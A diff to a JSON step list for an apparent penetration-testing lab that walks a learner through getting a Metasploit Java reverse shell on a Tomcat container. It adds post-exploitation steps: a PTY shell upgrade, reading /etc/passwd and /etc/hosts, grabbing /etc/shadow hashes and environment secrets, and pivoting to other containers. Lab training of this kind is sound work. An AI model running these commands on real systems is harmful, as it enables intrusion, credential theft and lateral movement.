@@ -55,8 +55,8 @@
     },
     {
       "title": "Choose a payload",
-      "command": "set PAYLOAD java/meterpreter/reverse_tcp",
-      "explanation": "Use a Java Meterpreter payload for a powerful shell."
+      "command": "set PAYLOAD java/shell_reverse_tcp",
+      "explanation": "Use a Java reverse shell payload. This is more reliable than meterpreter for Tomcat."
     },
     {
       "title": "Set your listener IP",
@@ -67,25 +67,42 @@
       "title": "Execute the exploit",
       "command": "run",
       "explanation": "Metasploit creates a WAR, uploads it, triggers execution, and catches the shell.",
-      "expected": "[*] Meterpreter session 1 opened",
+      "expected": "[*] Command shell session 1 opened",
       "duration": "5-15 sec"
     },
     {
-      "title": "Explore with Meterpreter",
-      "command": "getuid",
-      "explanation": "Check what user you're running as.",
-      "expected": "Server username (probably tomcat or root)"
+      "title": "Check your access",
+      "command": "id",
+      "explanation": "Check what user you're running as. No prompt is normal - raw shells don't show one.",
+      "expected": "uid=0(root) gid=0(root) groups=0(root)"
     },
     {
-      "title": "Get system info",
-      "command": "sysinfo",
-      "explanation": "See details about the compromised system."
+      "title": "Upgrade to a real prompt",
+      "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "explanation": "Raw reverse shells have no prompt. This spawns a proper PTY so you get a familiar bash prompt.",
+      "expected": "root@<container>:/# prompt appears"
+    },
+    {
+      "title": "Explore the system",
+      "command": "cat /etc/passwd",
+      "explanation": "List system users to understand the environment."
+    },
+    {
+      "title": "Check the network",
+      "command": "ip addr",
+      "explanation": "See network interfaces. You're inside the Docker network now - potential pivot point."
+    },
+    {
+      "title": "Look for other targets",
+      "command": "cat /etc/hosts",
+      "explanation": "Docker often adds other container hostnames here. These are your next targets."
     }
   ],
-  "success_criteria": "You have a Meterpreter session and can run commands on the Tomcat server.",
+  "success_criteria": "You have a root shell with a proper prompt and can explore the compromised system.",
   "next_steps": [
-    "Try 'shell' to drop into a system shell",
-    "Use 'upload' and 'download' to transfer files",
-    "Explore post/multi/gather modules"
+    "Run 'env' to find secrets in environment variables",
+    "Check 'cat /etc/shadow' to grab password hashes",
+    "Scan internal network: ping 172.20.0.10 (DVWA)",
+    "Try to pivot to other containers on the network"
   ]
 }
